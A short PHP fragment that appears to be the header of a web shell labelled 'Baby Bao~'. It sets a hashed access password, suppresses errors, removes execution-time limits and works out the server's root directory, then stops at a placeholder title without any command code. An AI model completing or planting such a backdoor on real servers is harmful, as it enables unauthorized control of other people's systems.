<?php 
error_reporting(E_ERROR);
header("content-Type: text/html; charset=gb2312");
ini_set('max_execution_time',100000);
ini_set('memory_limit','256M');
define('PASSWD','43bd68a8436063a7a5b25a04a685942e');
define('VERSION','Baby Bao~');
define('THISFILE',str_replace(array('\\','//'),array('/','/'),__FILE__));
define('THISDIR',dirname(THISFILE).'/');
define('ROOTDIR',strtr(THISFILE,array($_SERVER['PHP_SELF'] => '')).'/');



?>
<title>xxxxxxxxxxxxxx</title>